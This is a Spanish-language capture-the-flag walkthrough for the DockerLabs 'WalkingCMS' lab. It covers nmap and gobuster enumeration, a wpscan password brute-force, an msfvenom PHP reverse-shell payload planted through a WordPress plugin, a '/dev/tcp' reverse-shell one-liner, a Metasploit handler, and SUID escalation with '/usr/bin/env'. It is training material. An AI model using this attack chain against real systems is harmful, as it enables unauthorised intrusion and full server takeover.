---
tags:
  - Cybersecurity
  - Labs
  - DockerLabs
  - Easy
  - Linux
  - HTTP
  - FuzzingWeb
  - WordPress
  - CMS
  - ReverseShell
  - PrivilegeEscalation
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#WordPress|WordPress]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#SUID|SUID]]

---
# Resolviendo la máquina WalkingCMS

>En esta publicación, comparto cómo resolví la máquina **WalkingCMS** de [DockerLabs](https://dockerlabs.es/).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 172.17.0.2`

![[Pasted image 20250725190446.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts`

![[Pasted image 20250725190547.png]]

`nmap -p80 -sCV 172.17.0.2 -oN targeted`

![[Pasted image 20250725190601.png]]
### HTTP

`http://172.17.0.2/`

![[Pasted image 20250725190921.png]]
#### Fuzzing Web

`gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250725191016.png]]

`http://172.17.0.2/wordpress/`

![[Pasted image 20250725191049.png]]

---
## Explotación
### WordPress

`wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp`

![[Pasted image 20250725191307.png]]
![[Pasted image 20250725191331.png]]

`wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames mario`

![[Pasted image 20250725191538.png]]
![[Pasted image 20250725191608.png]]

Con las credenciales obtenidas (`mario` / `love`), se accede al panel de **WordPress**.

![[Pasted image 20250725191804.png]]

Se observa que tiene instalado un *plugin* llamado *Code Editor*, donde se puede editar código.

Se crea un nuevo documento llamado: `pwned.php`.

![[Pasted image 20250725192606.png]]

Se crea un *payload malicioso*.

`msfvenom -p php/reverse_php LHOST=192.168.1.127 LPORT=1234 -f raw > pwned.php`

Se visualiza el archivo creado anteriormente.

`cat pwned.php`.

Se copia el archivo y se añade al documento creado anteriormente.

![[Pasted image 20250725192749.png]]
### Reverse Shell

Se inicia una escucha en el puerto 1234  para recibir la *reverse shell*.

`nc -nlvp 1234`

`sh -i >& /dev/tcp/192.168.1.127/1235 0>&1`

![[Pasted image 20250725193325.png]]

Se inicia nuevamente una escucha en el puerto 1235 para recibir la *reverse shell* y entablar una conexión estable.

`vim handler.rc`

```
use multi/handler
set PAYLOAD php/reverse_php
set LHOST 192.168.1.127
set LPORT 1235
run
```

`msfconsole -r handler.rc`

![[Pasted image 20250725193345.png]]

`background`

`sessions -u 1`

`sessions 2`
### Escalada de Privilegios
#### SUID

Se realiza una búsqueda de permisos **SUID**.

`find / -perm -4000 2>/dev/null`

![[Pasted image 20250725193757.png]]

Se observa un binario con permisos **SUID** sospechoso: `/usr/bin/env`. Se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid).

![[Pasted image 20250725193943.png]]

`/usr/bin/env /bin/sh -p`

![[Pasted image 20250725194006.png]]

---
